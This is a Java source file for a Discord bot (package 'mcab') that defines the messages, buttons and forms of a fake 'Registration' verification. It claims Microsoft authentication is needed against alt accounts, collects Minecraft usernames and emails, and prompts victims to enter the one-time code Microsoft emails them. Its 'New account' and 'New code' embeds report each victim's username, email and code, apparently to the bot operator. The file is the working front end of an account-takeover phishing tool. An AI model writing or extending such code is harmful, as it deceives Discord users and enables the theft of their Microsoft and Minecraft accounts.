package me.skinnynoonie.mcab;

import net.dv8tion.jda.api.EmbedBuilder;
import net.dv8tion.jda.api.entities.MessageEmbed;
import net.dv8tion.jda.api.entities.emoji.Emoji;
import net.dv8tion.jda.api.interactions.commands.build.CommandData;
import net.dv8tion.jda.api.interactions.commands.build.Commands;
import net.dv8tion.jda.api.interactions.components.ActionRow;
import net.dv8tion.jda.api.interactions.components.buttons.Button;
import net.dv8tion.jda.api.interactions.components.buttons.ButtonStyle;
import net.dv8tion.jda.api.interactions.components.text.TextInput;
import net.dv8tion.jda.api.interactions.components.text.TextInputStyle;
import net.dv8tion.jda.api.interactions.modals.Modal;

public final class Messages {

    public static final CommandData INITIAL_PROMPT_SEND_CMD = Commands.slash(
            "send-message",
                    "Paste the prompt message."
            )
            .setGuildOnly(true);

    public static final MessageEmbed INITIAL_PROMPT_EMBED = new EmbedBuilder()
            .setTitle("®Registration")
            .setDescription(
                    """
                    In order to prevent botting and alt accounts, all members have to authenticate their discord account with the Microsoft API.
                    
                    **__How to verify?__**
                    1. Click the button below.
                    2. In the form, enter the following data associated with the account:
                    ```
                    • Minecraft Username
                    • Minecraft Email
                    ```
                    """)
            .setImage("https://cdn.discordapp.com/attachments/1190737686051442729/1217813780310921256/How_to_register.gif?ex=663f6677&is=663e14f7&hm=88b3cc4dc5357627c743438e58b1440e58f47231fae1a4747606c8b2acf72364&")
            .build();

    public static final Button INITIAL_PROMPT_REGISTER_BUTTON = Button.of(
            ButtonStyle.SECONDARY,
            "initial_prompt_register_button",
            "Register",
            Emoji.fromFormatted("\uD83D\uDCDD") // 📝
    );

    public static final Modal REGISTER_FORM_MODAL = Modal.create("register_form_modal", "Verification")
            .addComponents(
                    ActionRow.of(
                            TextInput.create("username", "Username", TextInputStyle.SHORT)
                                    .setPlaceholder("Username")
                                    .setMinLength(3)
                                    .setMaxLength(16)
                                    .setRequired(true)
                                    .build()
                    ),
                    ActionRow.of(
                            TextInput.create("email", "Email", TextInputStyle.SHORT)
                                    .setPlaceholder("Email")
                                    .setMinLength(5)
                                    .setRequired(true)
                                    .build()
                    )
            )
            .build();

    public static MessageEmbed CHECK_EMAIL_FOR_CODE_EMBED = new EmbedBuilder()
            .setTitle(":white_check_mark: Verify your email")
            .setDescription("""
                            Check your email for a code from Microsoft. Then enter the code by pressing the button below.
                           
                            *Note: If you can not find the code, try refreshing your page or checking your spam folders.*
                            """)
            .build();

    public static Button VERIFY_CODE_BUTTON = Button.success("verify_code_button", "Verify");

    public static Modal VERIFY_CODE_MODAL = Modal.create("verify_code_modal", "Verification")
            .addComponents(
                    ActionRow.of(
                            TextInput.create("code", "Verification code", TextInputStyle.SHORT)
                                    .setPlaceholder("0000000")
                                    .setMinLength(7)
                                    .setMaxLength(7)
                                    .setRequired(true)
                                    .build()
                    )
            )
            .build();

    public static Button SEND_INVALID_CODE_ERROR_BUTTON = Button.danger("send_invalid_code_error_button", "Invalid");

    public static MessageEmbed INVALID_CODE_ERROR_EMBED = new EmbedBuilder()
            .setTitle(":x: Invalid code")
            .setDescription("The input verification code is invalid. Please try again.")
            .build();

    public static MessageEmbed INVALID_EMAIL_OR_USERNAME_EMBED = new EmbedBuilder()
            .setTitle(":x: Invalid email or username")
            .setDescription("The input username/email is invalid. Please try again.")
            .build();

    public static MessageEmbed accountCredEmbedNotice(String username, String email) {
        return new EmbedBuilder()
                .setTitle("New account:")
                .setDescription(
                        """
                        Username: %s
                        Email: %s
                        """.formatted(username, email)
                )
                .build();
    }

    public static MessageEmbed newCodeRetrived(String username, String email, String code) {
        return new EmbedBuilder()
                .setTitle("New code:")
                .setDescription(
                        """
                        Username: %s
                        Email: %s
                        Code: **%s**
                        """.formatted(username, email, code)
                )
                .build();
    }


    private Messages() {
    }

}
